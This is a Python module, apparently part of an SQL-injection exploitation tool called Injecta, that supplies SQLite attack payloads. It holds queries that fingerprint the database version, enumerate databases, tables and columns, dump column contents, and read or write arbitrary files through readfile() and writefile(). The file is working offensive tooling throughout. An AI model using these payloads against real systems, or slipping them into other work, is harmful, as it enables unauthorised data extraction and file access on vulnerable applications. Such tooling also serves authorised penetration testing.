"""
Injecta — SQLite payload provider
"""
from typing import List


class SQLitePayloads:
    name = "sqlite"
    comment = "-- "
    inline_comment = "/*!*/"
    substitution_char = "s"

    @staticmethod
    def version() -> List[str]:
        return [
            "SELECT sqlite_version()",
        ]

    @staticmethod
    def databases() -> List[str]:
        return [
            "SELECT group_concat(name, ',') FROM pragma_database_list",
        ]

    @staticmethod
    def tables(db: str) -> List[str]:
        return [
            "SELECT group_concat(name, ',') FROM sqlite_master WHERE type='table'",
        ]

    @staticmethod
    def columns(db: str, table: str) -> List[str]:
        return [
            f"SELECT group_concat(name, ',') FROM pragma_table_info('{table}')",
            f"SELECT sql FROM sqlite_master WHERE tbl_name='{table}'",
        ]

    @staticmethod
    def dump_column(db: str, table: str, column: str, limit: int = 0) -> List[str]:
        q = f"SELECT {column} FROM {table}"
        if limit > 0:
            q += f" LIMIT {limit}"
        return [q]

    @staticmethod
    def current_user() -> List[str]:
        return []

    @staticmethod
    def current_db() -> List[str]:
        return ["SELECT 'main'"]

    @staticmethod
    def count_tables(db: str) -> List[str]:
        return ["SELECT COUNT(*) FROM sqlite_master WHERE type='table'"]

    @staticmethod
    def count_columns(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM pragma_table_info('{table}')"]

    @staticmethod
    def count_rows(db: str, table: str) -> List[str]:
        return [f"SELECT COUNT(*) FROM {table}"]

    @staticmethod
    def banner() -> List[str]:
        return ["SELECT sqlite_version()"]

    @staticmethod
    def is_dba() -> List[str]:
        return []

    @staticmethod
    def is_admin() -> List[str]:
        return []

    @staticmethod
    def privileges() -> List[str]:
        return []

    @staticmethod
    def file_read(path: str) -> List[str]:
        return [
            f"SELECT readfile('{path}')",
        ]

    @staticmethod
    def file_write(path: str, content: str) -> List[str]:
        escaped = content.replace("'", "''")
        return [
            f"SELECT writefile('{path}', '{escaped}')",
        ]

    @staticmethod
    def os_cmd(cmd: str) -> List[str]:
        return []

    @staticmethod
    def oob_call(target: str, data: str) -> List[str]:
        return []
